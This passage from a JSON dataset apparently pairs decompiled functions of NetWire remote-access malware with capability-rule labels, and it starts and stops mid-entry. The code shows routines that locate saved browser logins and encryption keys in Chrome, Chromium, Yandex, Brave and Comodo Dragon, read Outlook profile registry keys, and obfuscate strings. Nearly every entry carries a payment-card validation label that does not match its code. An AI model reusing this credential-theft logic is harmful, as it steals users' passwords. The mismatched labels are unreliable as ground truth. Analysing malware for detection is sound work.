= fcn.004081aa(\"M5QV9C5I\");\n            fcn.00410608(0x80000002, auStack1044, uVar3, 1, auStack528);\n        }\n        cVar1 = fcn.004082e8(4);\n        if (cVar1 != '\\0') {\n            *0x42b460 = sub.msvcrt.dll_fopen(auStack2076, 0x4230c0);\n        }\n        cVar1 = fcn.004082e8(0x40);\n        if (cVar1 != '\\0') {\n            fcn.00412d73(0x422400, auStack528, 0x204);\n            fcn.00412548(0x422400, auStack528, 0x81);\n            fcn.00407f08(0x409e61, 0);\n        }\n        fcn.00408e7f(0x42e220);\n    }\n    return;\n}\n",
        "token_count": 1125
    },
    "004092b2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004092b2(int32_t param_1, uint param_2)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.00410803(0x80000001, \"SOFTWARE\\\\NetWire\", \"HostId\");\n    if ((cVar1 != '\\0') && (cVar1 = fcn.00410608(0x80000001, \"SOFTWARE\\\\NetWire\", \"HostId\", 1, param_2),  cVar1 != '\\0')\n       ) {\n        fcn.004129e4(param_1 + 4, 0, 0x20);\n        fcn.00412548(param_1 + 4, param_2, 0x20);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 173
    },
    "004096f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004096f0(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    for (iVar1 = 0; iVar1 != param_2; iVar1 = iVar1 + 1) {\n        *(param_1 + iVar1) = (*(param_1 + iVar1) ^ 0x9d) + 0x24;\n    }\n    return;\n}\n",
        "token_count": 95
    },
    "0040a115": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a115(uint param_1)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint16_t uStack292;\n    ushort uStack290;\n    uchar auStack288 [2];\n    ushort uStack286;\n    uchar auStack276 [268];\n    \n    cVar1 = fcn.004082e8(0x40);\n    if (cVar1 != '\\0') {\n        sub.KERNEL32.dll_GetLocalTime(auStack288);\n        uVar2 = uStack292;\n        fcn.004127a8(auStack276, 0x104, \"%.2d-%.2d-%.4d\", uStack286, uStack290, uVar2);\n        iVar3 = fcn.004127f3(auStack276, param_1, 10);\n        if (iVar3 == 0) {\n            fcn.0040970c();\n        }\n        fcn.004127a8(auStack276, 0x104, 0x42330d, 0x422400, param_1, uVar2);\n        fcn.00406e04(auStack276);\n    }\n    return;\n}\n",
        "token_count": 268
    },
    "0040a1d5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040a1d5(uint param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    uchar auStack272 [268];\n    \n    cVar1 = fcn.004082e8(0x40);\n    uVar2 = 0xffffffff;\n    if (cVar1 != '\\0') {\n        fcn.004127a8(auStack272, 0x104, 0x42330d, 0x422400, param_1);\n        uVar2 = fcn.004074c5(auStack272);\n    }\n    return uVar2;\n}\n",
        "token_count": 136
    },
    "0040a23c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a23c(char *param_1, int32_t param_2, int32_t param_3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint8_t auStack48 [32];\n    \n    uVar2 = 0xffffffff;\n    pcVar4 = param_1;\n    do {\n        if (uVar2 == 0) break;\n        uVar2 = uVar2 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    uVar2 = ~uVar2 - 1;\n    for (iVar5 = 0; uVar6 = uVar2,  iVar5 < uVar2; iVar5 = iVar5 + 1) {\n        auStack48[iVar5] = param_1[iVar5] << 4 | param_1[iVar5] >> 4;\n    }\n    for (; uVar6 < 0x20; uVar6 = uVar6 + 1) {\n        uVar3 = uVar6;\n        auStack48[uVar6] = (uVar3 << 3 | uVar3 >> 5) & uVar3;\n    }\n    iVar5 = 0;\n    uVar6 = auStack48[uVar2 >> 2] ^ uVar2;\n    do {\n        uVar6 = (auStack48[iVar5] ^ *(param_2 + iVar5)) ^ uVar6;\n        uVar3 = uVar6;\n        *(param_3 + iVar5) = uVar3;\n        uVar6 = ~*(param_2 + iVar5) ^ uVar6 * 4;\n        *(param_3 + iVar5) = uVar3 << 3 | uVar3 >> 5 | uVar2 + iVar5 ^ iVar5;\n        iVar5 = iVar5 + 1;\n    } while (iVar5 != 0x20);\n    return;\n}\n",
        "token_count": 467
    },
    "0040a3de": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040a3de(uint param_1, uint param_2, uint param_3)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uchar auStack44 [36];\n    \n    uVar1 = param_3;\n    fcn.0040a23c(\"oluchi\", param_2, auStack44);\n    iVar2 = fcn.00403c36(0x42e4a0, auStack44, 0x20);\n    if (iVar2 == 0) {\n        fcn.00403cb2(0x42e4a0, 0x42e280, uVar1, uVar1, 0x10, 1);\n        iVar2 = fcn.004129c0(uVar1, 0x422834, 0x10);\n        if (iVar2 == 0) {\n            *0x422844 = param_1;\n            return 1;\n        }\n        fcn.00405d7d(param_1, 0x9a, 0, 0);\n        fcn.00403c8c(0x42e4a0);\n    }\n    else {\n        fcn.00405999(&param_1);\n    }\n    return 0;\n}\n",
        "token_count": 279
    },
    "0040b105": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0040b105(uint param_1, uint param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    uchar auStack540 [8];\n    uchar auStack532 [503];\n    uchar uStack29;\n    \n    bVar5 = false;\n    fcn.004129e4(param_2, 0, param_3);\n    uVar1 = sub.msvcrt.dll_fopen(param_1, 0x423378);\n    if (uVar1 == 0) goto code_r0x0040b1e7;\n    iVar2 = sub.msvcrt.dll_fread(auStack540, 1, 0x200, uVar1);\n    if (iVar2 == 0) {\ncode_r0x0040b178:\n        bVar5 = false;\n    }\n    else {\n        uStack29 = 0;\n        iVar2 = fcn.004125de(0, \"Default=\", auStack540);\n        iVar2 = iVar2 + 8;\n        iVar3 = fcn.004125de(iVar2, 0x423380, auStack540);\n        if (((iVar2 < 9) || (iVar3 + 1 <= iVar2)) || (uVar4 = (iVar3 + 1) - iVar2,  param_3 <= uVar4))\n        goto code_r0x0040b178;\n        iVar2 = fcn.00412548(param_2, auStack540 + iVar2, uVar4);\n        bVar5 = iVar2 != 0;\n    }\n    uVar1 = sub.msvcrt.dll_fclose(uVar1);\ncode_r0x0040b1e7:\n    return uVar1 & 0xffffff00 | bVar5;\n}\n",
        "token_count": 417
    },
    "0040b1f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040b1f4(uint param_1, uint param_2, uint param_3)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint uStack618;\n    uchar auStack614 [6];\n    uchar auStack608 [64];\n    uchar auStack544 [528];\n    \n    uStack618 = 0x343678;\n    puVar4 = auStack614;\n    for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    fcn.004129e4(param_2, 0, param_3);\n    uVar2 = fcn.004081aa(\"MT_qUDrj\\\\FWk4iiC\\\\%6\\\\\");\n    fcn.004127a8(auStack544, 0x204, uVar2, param_1);\n    uVar2 = fcn.004081aa(\"PQ00dR5zd064WR\");\n    cVar1 = fcn.004106bd(0x80000002, auStack544, uVar2, auStack608, 0x40);\n    if ((cVar1 != '\\0') && (iVar3 = fcn.00412630(auStack608, &uStack618),  iVar3 != 0)) {\n        uVar2 = fcn.004081aa(\"MT_qUDrj\\\\FWk4iiC\\\\%6\\\\%6\\\\FC4R\");\n        fcn.004127a8(auStack544, 0x204, uVar2, param_1, auStack608);\n        uVar2 = fcn.004081aa(\"XR65Cii a40dY5W0Z\");\n        uVar2 = fcn.004106bd(0x80000002, auStack544, uVar2, param_2, param_3);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 458
    },
    "0040c46e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint32_t fcn.0040c46e(uint param_1, uint param_2, uint param_3, uint param_4, uint *param_5)\n\n{\n    uint32_t uVar1;\n    \n    *param_5 = param_4;\n    uVar1 = sub.ADVAPI32.DLL_RegQueryValueExA(param_1, param_2, 0, 0, param_3, param_5);\n    return uVar1 & 0xffffff00 | uVar1 == 0;\n}\n",
        "token_count": 116
    },
    "0040d115": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040d115(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    uint uStack28;\n    char *pcStack24;\n    char *pcStack20;\n    char *apcStack16 [2];\n    \n    iVar3 = 0;\n    uStack28 = 0;\n    pcStack24 = fcn.0040c4b7(\n                            \"Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows Messaging Subsystem\\\\Profiles\\\\Outlook\\\\9375CFF0413111d3B88A00104B2A6676\"\n                            );\n    if (pcStack24 != NULL) {\n        uVar2 = 0xffffffff;\n        pcVar5 = pcStack24;\n        do {\n            if (uVar2 == 0) break;\n            uVar2 = uVar2 - 1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        iVar3 = ~uVar2 - 1;\n        uStack28 = fcn.00412abf(&uStack28, 0, &pcStack24, iVar3, 1);\n    }\n    pcStack20 = fcn.0040c4b7(\n                            \"Software\\\\Microsoft\\\\Office\\\\15.0\\\\Outlook\\\\Profiles\\\\Outlook\\\\9375CFF0413111d3B88A00104B2A6676\"\n                            );\n    iVar4 = iVar3;\n    if (pcStack20 != NULL) {\n        uVar2 = 0xffffffff;\n        pcVar5 = pcStack20;\n        do {\n            if (uVar2 == 0) break;\n            uVar2 = uVar2 - 1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        iVar4 = iVar3 + (~uVar2 - 1);\n        uStack28 = fcn.00412abf(&uStack28, iVar3, &pcStack20, ~uVar2 - 1, 1);\n    }\n    apcStack16[0] =\n         fcn.0040c4b7(\"Software\\\\Microsoft\\\\Office\\\\16.0\\\\Outlook\\\\Profiles\\\\Outlook\\\\9375CFF0413111d3B88A00104B2A6676\")\n    ;\n    if (apcStack16[0] != NULL) {\n        uVar2 = 0xffffffff;\n        pcVar5 = apcStack16[0];\n        do {\n            if (uVar2 == 0) break;\n            uVar2 = uVar2 - 1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        uStack28 = fcn.00412abf(&uStack28, iVar4, apcStack16, ~uVar2 - 1, 1);\n    }\n    return uStack28;\n}\n",
        "token_count": 690
    },
    "0040d212": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040d212(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = 0;\n    for (iVar2 = 0; iVar2 < param_2; iVar2 = iVar2 + 1) {\n        iVar1 = iVar1 + (*(param_1 + iVar2) << (iVar2 * '\\b' & 0x1fU));\n    }\n    return iVar1;\n}\n",
        "token_count": 113
    },
    "0040d235": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0040d235(uint param_1, uint param_2, uint32_t param_3, int32_t param_4)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    \n    uVar1 = fcn.00407fc3(param_1, param_4, param_4 >> 0x1f, 0);\n    bVar2 = false;\n    if (uVar1 == 0) {\n        uVar1 = sub.msvcrt.dll_fread(param_2, 1, param_3, param_1);\n        bVar2 = param_3 == uVar1;\n    }\n    return uVar1 & 0xffffff00 | bVar2;\n}\n",
        "token_count": 160
    },
    "0040d290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0040d290(uint param_1, uint param_2, int32_t param_3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t uVar5;\n    char cVar6;\n    uchar *puVar7;\n    uint uVar8;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uchar *puStack96;\n    int32_t iStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack56;\n    uint uStack36;\n    uint uStack32;\n    \n    uStack84 = 4;\n    uStack88 = 0;\n    uStack56 = 0;\n    iStack92 = param_3;\n    puStack96 = 0x40d2bb;\n    fcn.004129e4();\n    uStack76 = 0xf0000000;\n    uStack80 = 1;\n    uStack84 = 0;\n    uStack88 = 0;\n    iStack92 = 0x42b5cc;\n    puStack96 = 0x40d2e7;\n    uVar3 = sub.ADVAPI32.DLL_CryptAcquireContextA();\n    uVar5 = 0;\n    if (uVar3 != 0) {\n        puStack96 = &stack0xffffffb4;\n        uStack100 = 0;\n        uStack104 = 0;\n        uStack108 = 0x8004;\n        uVar8 = *0x42b5cc;\n        iVar4 = sub.ADVAPI32.DLL_CryptCreateHash(*0x42b5cc);\n        if (iVar4 != 0) {\n            puVar7 = puStack96;\n            iVar4 = sub.ADVAPI32.DLL_CryptHashData(puStack96, uStack36, uStack32, 0);\n            if (iVar4 != 0) {\n                puVar7 = NULL;\n                uStack108 = 0x14;\n                iVar4 = sub.ADVAPI32.DLL_CryptGetHashParam(uVar8, 2, &stack0xffffff98, &stack0xffffff94, 0);\n                if (iVar4 != 0) {\n                    cVar6 = '\\0';\n                    iVar4 = 0;\n                    do {\n                        cVar1 = (&stack0xffffff98)[iVar4];\n                        cVar6 = cVar6 + cVar1;\n                        iVar2 = iVar4 * 2;\n                        iVar4 = iVar4 + 1;\n                        fcn.004127a8(iVar2 + param_3, 2, \"%.2X\", cVar1);\n                    } while (iVar4 != 0x14);\n                    uVar3 = fcn.004127a8(param_3 + 0x28, 2, \"%.2X\", cVar6);\n                    uVar5 = 1;\n                    goto code_r0x0040d416;\n                }\n            }\n            sub.ADVAPI32.DLL_CryptDestroyHash(puVar7);\n        }\n        uVar3 = sub.ADVAPI32.DLL_CryptReleaseContext(*0x42b5cc, 0);\n        uVar5 = 0;\n    }\ncode_r0x0040d416:\n    return uVar3 & 0xffffff00 | uVar5;\n}\n",
        "token_count": 756
    },
    "0040d420": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0040d420(uint param_1, uint param_2, uint param_3, uint param_4, uint param_5)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint unaff_EBP;\n    uint unaff_EDI;\n    code *pcVar6;\n    uint *puVar7;\n    uchar auStack2168 [4];\n    uint *puStack2164;\n    code *pcStack2160;\n    int32_t *piStack2156;\n    uchar auStack2152 [4];\n    uint auStack2148 [7];\n    uchar auStack2119 [42];\n    uchar uStack2077;\n    uchar auStack2076 [2060];\n    \n    fcn.004129e4(param_4, 0, param_5);\n    uVar2 = fcn.0040d290(param_2, param_3, auStack2119);\n    uVar1 = uVar2;\n    if (uVar1 != 0) {\n        uStack2077 = 0;\n        auStack2148[0] = 0x800;\n        uVar3 = fcn.004081aa(\"Y0Zs5Nh.Sii\");\n        uVar3 = fcn.00407f7a(uVar3);\n        uVar4 = fcn.004081aa(\"P0Zs5uRs0W5dY5aC5C\");\n        puStack2164 = fcn.00407f8e(uVar3, uVar4);\n        puVar7 = auStack2148;\n        pcVar6 = auStack2076;\n        pcStack2160 = pcVar6;\n        iVar5 = sub.ADVAPI32.DLL_RegQueryValueExA(param_1, auStack2119, 0, 0, pcVar6, puVar7);\n        if (iVar5 == 0) {\n            auStack2148[0] = param_2;\n            puStack2164 = puVar7;\n            iVar5 = (*pcVar6)(auStack2168, 0, auStack2152, 0, 0, 1, &pcStack2160);\n            if (iVar5 != 0) {\n                iVar5 = piStack2156[1] + *piStack2156;\n                if (piStack2156[2] + iVar5 <= pcStack2160) {\n                    fcn.004127a8(unaff_EDI, unaff_EBP, \"%c%S\\a%S:%S\\b\\b\\b\\b\", 2, param_2, \n                                 piStack2156 + piStack2156[9] + iVar5, piStack2156 + piStack2156[0xd] + iVar5);\n                }\n                uVar2 = sub.KERNEL32.dll_LocalFree(piStack2156);\n                goto code_r0x0040d5ca;\n            }\n        }\n        uVar1 = 0;\n        uVar2 = fcn.00407fab(uVar3);\n    }\ncode_r0x0040d5ca:\n    return uVar2 & 0xffffff00 | uVar1;\n}\n",
        "token_count": 702
    },
    "0040d5d7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040d5d7(char *param_1, int32_t param_2, uint param_3, int32_t *param_4)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    \n    fcn.004129e4(param_2, 0, param_3);\n    uVar2 = 0xffffffff;\n    iVar3 = 0;\n    pcVar4 = param_1;\n    do {\n        if (uVar2 == 0) break;\n        uVar2 = uVar2 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    *param_4 = ~uVar2 * 2;\n    do {\n        uVar2 = 0xffffffff;\n        pcVar4 = param_1;\n        do {\n            if (uVar2 == 0) break;\n            uVar2 = uVar2 - 1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        if (~uVar2 - 1 <= iVar3) {\n            return;\n        }\n        *(param_2 + iVar3 * 2) = param_1[iVar3];\n        iVar3 = iVar3 + 1;\n    } while( true );\n}\n",
        "token_count": 321
    },
    "0040e3b5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040e3b5(int32_t *param_1)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    uint uStack32;\n    int32_t iStack28;\n    int32_t iStack24;\n    char *pcStack20;\n    int32_t iStack16;\n    \n    uStack32 = 0;\n    pcStack20 = NULL;\n    *param_1 = 0;\n    *0x42b5c0 = 0;\n    iStack24 = fcn.00410520(0x80000001, \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Shell Folders\", \n                            \"History\");\n    if (iStack24 != 0) {\n        fcn.0040db1c(iStack24, 0, &pcStack20);\n        fcn.00407f59(&iStack24);\n    }\n    iVar3 = 0;\n    if (pcStack20 != NULL) {\n        uVar2 = 0xffffffff;\n        pcVar4 = pcStack20;\n        do {\n            if (uVar2 == 0) break;\n            uVar2 = uVar2 - 1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        iStack28 = ~uVar2 - 1;\n        uStack32 = fcn.00412abf(&uStack32, 0, &pcStack20, iStack28, 1);\n        iVar3 = iStack28;\n    }\n    iStack16 = fcn.0040dce9(&iStack28);\n    if (iStack16 != 0) {\n        uStack32 = fcn.00412abf(&uStack32, iVar3, &iStack16, iStack28, 1);\n        iVar3 = iVar3 + iStack28;\n    }\n    *param_1 = iVar3;\n    return uStack32;\n}\n",
        "token_count": 449
    },
    "0040f21c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040f21c(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    uchar auStack528 [524];\n    \n    uVar2 = sub.msvcrt.dll_getenv(\"LOCALAPPDATA\");\n    uVar3 = fcn.004081aa(\"%6\\\\EWWnid\\\\PI0Wld\\\\u6d0 aC5C\\\\ad8CQi5\\\\mWn4R aC5C\");\n    fcn.004127a8(auStack528, 0x204, uVar3, uVar2);\n    cVar1 = fcn.00406f1a(auStack528);\n    uVar2 = 0;\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.0040e7b0(4, auStack528);\n    }\n    return uVar2;\n}\n",
        "token_count": 198
    },
    "0040f281": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040f281(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uchar auStack1044 [516];\n    uchar auStack528 [520];\n    \n    uVar2 = sub.msvcrt.dll_getenv(\"LOCALAPPDATA\");\n    fcn.004127a8(auStack1044, 0x204, \"%s\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\", uVar2);\n    uVar2 = sub.msvcrt.dll_getenv(\"LOCALAPPDATA\");\n    fcn.004127a8(auStack528, 0x204, \"%s\\\\Google\\\\Chrome\\\\User Data\\\\Local State\", uVar2);\n    cVar1 = fcn.00406f1a(auStack1044);\n    if ((cVar1 != '\\0') && (cVar1 = fcn.00406f1a(auStack528),  cVar1 != '\\0')) {\n        uVar2 = fcn.0040edd6(4, auStack1044, auStack528);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 244
    },
    "0040f31d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040f31d(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    uchar auStack528 [524];\n    \n    uVar2 = sub.msvcrt.dll_getenv(\"LOCALAPPDATA\");\n    uVar3 = fcn.004081aa(\"%6\\\\PI0Wl4Ql\\\\u6d0 aC5C\\\\ad8CQi5\\\\mWn4R aC5C\");\n    fcn.004127a8(auStack528, 0x204, uVar3, uVar2);\n    cVar1 = fcn.00406f1a(auStack528);\n    uVar2 = 0;\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.0040e7b0(5, auStack528);\n    }\n    return uVar2;\n}\n",
        "token_count": 197
    },
    "0040f382": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040f382(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uchar auStack1044 [516];\n    uchar auStack528 [520];\n    \n    uVar2 = sub.msvcrt.dll_getenv(\"LOCALAPPDATA\");\n    fcn.004127a8(auStack1044, 0x204, \"%s\\\\Chromium\\\\User Data\\\\Default\\\\Login Data\", uVar2);\n    uVar2 = sub.msvcrt.dll_getenv(\"LOCALAPPDATA\");\n    fcn.004127a8(auStack528, 0x204, \"%s\\\\Chromium\\\\User Data\\\\Local State\", uVar2);\n    cVar1 = fcn.00406f1a(auStack1044);\n    if ((cVar1 != '\\0') && (cVar1 = fcn.00406f1a(auStack528),  cVar1 != '\\0')) {\n        uVar2 = fcn.0040edd6(5, auStack1044, auStack528);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 242
    },
    "0040f41e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040f41e(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    uchar auStack528 [524];\n    \n    uVar2 = sub.msvcrt.dll_getenv(\"LOCALAPPDATA\");\n    uVar3 = fcn.004081aa(\"%6\\\\PWlWSW\\\\a0CnWR\\\\u6d0 aC5C\\\\ad8CQi5\\\\mWn4R aC5C\");\n    fcn.004127a8(auStack528, 0x204, uVar3, uVar2);\n    cVar1 = fcn.00406f1a(auStack528);\n    uVar2 = 0;\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.0040e7b0(8, auStack528);\n    }\n    return uVar2;\n}\n",
        "token_count": 200
    },
    "0040f483": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040f483(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uchar auStack1044 [516];\n    uchar auStack528 [520];\n    \n    uVar2 = sub.msvcrt.dll_getenv(\"LOCALAPPDATA\");\n    fcn.004127a8(auStack1044, 0x204, \"%s\\\\Comodo\\\\Dragon\\\\User Data\\\\Default\\\\Login Data\", uVar2);\n    uVar2 = sub.msvcrt.dll_getenv(\"LOCALAPPDATA\");\n    fcn.004127a8(auStack528, 0x204, \"%s\\\\Comodo\\\\Dragon\\\\User Data\\\\Local State\", uVar2);\n    cVar1 = fcn.00406f1a(auStack1044);\n    if ((cVar1 != '\\0') && (cVar1 = fcn.00406f1a(auStack528),  cVar1 != '\\0')) {\n        uVar2 = fcn.0040edd6(10, auStack1044, auStack528);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 246
    },
    "0040f51f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040f51f(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    uchar auStack528 [524];\n    \n    uVar2 = sub.msvcrt.dll_getenv(\"LOCALAPPDATA\");\n    uVar3 = fcn.004081aa(\"%6\\\\vCRSdf\\\\vCRSdfc0Wg6d0\\\\u6d0 aC5C\\\\ad8CQi5\\\\mWn4R aC5C\");\n    fcn.004127a8(auStack528, 0x204, uVar3, uVar2);\n    cVar1 = fcn.00406f1a(auStack528);\n    uVar2 = 0;\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.0040e7b0(9, auStack528);\n    }\n    return uVar2;\n}\n",
        "token_count": 206
    },
    "0040f584": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040f584(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uchar auStack1044 [516];\n    uchar auStack528 [520];\n    \n    uVar2 = sub.msvcrt.dll_getenv(\"LOCALAPPDATA\");\n    fcn.004127a8(auStack1044, 0x204, \"%s\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Login Data\", uVar2);\n    uVar2 = sub.msvcrt.dll_getenv(\"LOCALAPPDATA\");\n    fcn.004127a8(auStack528, 0x204, \"%s\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Local State\", uVar2);\n    cVar1 = fcn.00406f1a(auStack1044);\n    if ((cVar1 != '\\0') && (cVar1 = fcn.00406f1a(auStack528),  cVar1 != '\\0')) {\n        uVar2 = fcn.0040edd6(10, auStack1044, auStack528);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 250
    },
    "0040f620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040f620(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uchar auStack528 [524];\n    \n    uVar2 = sub.msvcrt.dll_getenv(\"LOCALAPPDATA\");\n    fcn.004127a8(auStack528, 0x204, \"%s\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Login Data\", uVar2);\n    cVar1 = fcn.00406f1a(auStack528);\n    uVar2 = 0;\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.0040e7b0(10, auStack528);\n    }\n    return uVar2;\n}\n",
        "token_count": 159
    },
    "0040f67b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040f67b(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uchar auStack1044 [516];\n    uchar auStack528 [520];\n    \n    uVar2 = sub.msvcrt.dll_getenv(\"LOCALAPPDATA\");\n    fcn.004127a8(auStack1044, 0x204, \"%s\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Login Data\", uVar2);\n    uVar2 = sub.msvcrt.dll_getenv(\"LOCALAPPDATA\");\n    fcn.004127a8(auStack528, 0x204, \"%s\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Local State\", uVar2);\n    cVar1 = fcn.00406f1a(auStack1044);\n    if ((cVar1 != '\\0') && (cVar1 = fcn.00406f1a(auStack528),  cVar1 != '\\0')) {\n        uVar2 = fcn.0040edd6(10, auStack1044, auStack528);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 255
    },
    "0040f717": {
        "rules": [
